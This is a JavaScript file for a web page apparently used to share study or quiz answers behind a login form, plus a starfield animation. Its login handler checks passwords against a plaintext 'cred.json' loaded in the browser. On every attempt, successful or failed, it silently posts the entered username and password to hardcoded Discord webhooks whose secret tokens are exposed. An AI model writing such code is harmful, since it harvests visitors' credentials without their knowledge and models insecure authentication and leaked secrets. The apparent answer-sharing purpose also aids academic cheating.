
document.addEventListener("DOMContentLoaded", function () {
    const container = document.querySelector(".container");
    const secretContent = document.getElementById("secretContent");
    secretContent.style.display = "none";
      const loginForm = document.createElement("form");
    loginForm.id = "loginForm";
    loginForm.innerHTML = `
      <h2>Login</h2>
      <input type="text" id="username" placeholder="Username" required><br>
      <input type="password" id="password" placeholder="Password" required><br>
      <button type="submit">Login</button>
      <p id="message"></p>`;

    container.prepend(loginForm); 
  
    loginForm.addEventListener("submit", function (e) {
      e.preventDefault();
  
      const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const message = document.getElementById("message");

  fetch("cred.json")
    .then(response => response.json())
    .then(data => {
      const user = data.find(u => u.username === username && u.password === password);
      if (user) {
        message.style.color = "#70ff70";
        message.textContent = "Login Successful!";
        const webhookUrl = "https://discord.com/api/webhooks/1362313786450772108/QG5wUyEJ26Hr3WKdQ0VPgKiCv6pc00ED-ZoptWVTP7N0YFNCIbhGn8UAln6m-fZ5d_--";
        const failedAttempt = {
          content: `✅ **Successful login:**\n**Username:** ${username}\n**Password:** ${password}`
        };
        fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(failedAttempt)
        }).then(response => {
          if (response.ok) {
            console.log("Failed attempt sent to Discord.");
          } else {
            console.error("Failed to send webhook.");
          }
        }).catch(err => console.error("Error sending webhook:", err));
        loginForm.style.display = "none";
            secretContent.style.display = "block";
      } else {
        message.style.color = "#ff7070";
        message.textContent = "Invalid credentials.";
        const webhookUrl = "https://discord.com/api/webhooks/1362313506518597823/9E3VA75KsRPApPbEK5piO9sj1YYrhu37p80TFeG7v-ctD8h_PcrpHKdXk2Q18OlwGLdh";
        const failedAttempt = {
          content: `❌ Failed login attempt:\n**Username:** ${username}\n**Password:** ${password}`
        };

        fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(failedAttempt)
        }).then(() => {
          window.location.href = "denied.html";
        });
      }
    })
    .catch(err => {
      console.error("Error fetching credentials:", err);
      message.style.color = "#ff7070";
      message.textContent = "Could not load credentials.";
    });
    });
  });
  fetch('edanswers.json')
      .then(response => response.json())
      .then(data => {
        document.getElementById('page-title').textContent = data.title;
        document.getElementById('note').textContent = data.note;

        const features = document.getElementById('features');

        data.questions.forEach(item => {
          const featureDiv = document.createElement('div');
          featureDiv.className = 'feature';

          const question = document.createElement('h3');
          question.textContent = item.question;

          const answer = document.createElement('p');
          answer.className = 'RainbowGrad';
          answer.textContent = item.answer;

          featureDiv.appendChild(question);
          featureDiv.appendChild(answer);
          features.appendChild(featureDiv);
        });
      });
      function sendMessage() {
        const webhookUrl = "https://discord.com/api/webhooks/1346387489614598154/NzPlA0ERWf2_IlmVm3_MLw1qVIuuvaZkPSI-U9fI5W5b8UXjhhCaguBLVa3gQmzLRJHJ";
        const message = {
          content: "@here @everyone UPDATE STUDY.COM!!!!!!"
        };
  
        fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(message)
        })
        .then(response => {
          if (response.ok) {
            alert("Message sent!");
          } else {
            alert("Failed to send message.");
          }
        });
      }
      const canvas = document.getElementById("stars");
      const ctx = canvas.getContext("2d");
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      let stars = [];
      function Star() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.radius = Math.random() * 1.5;
        this.alpha = Math.random();
        this.speed = Math.random() * 0.5 + 0.2;
        this.update = function () {
          this.y += this.speed;
          if (this.y > canvas.height) {
            this.y = 0;
            this.x = Math.random() * canvas.width;
          }
        };
        this.draw = function () {
          ctx.beginPath();
          ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
          ctx.fillStyle = `rgba(255, 255, 255, ${this.alpha})`;
          ctx.fill();
        };
      }
      for (let i = 0; i < 200; i++) {
        stars.push(new Star());
      }
      function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        stars.forEach(star => {
          star.update();
          star.draw();
        });
        requestAnimationFrame(animate);
      }
      animate();
      window.addEventListener("resize", () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
      });
      window.addEventListener("DOMContentLoaded", () => {
        document.getElementById("intro").classList.add("grow-animation");
      });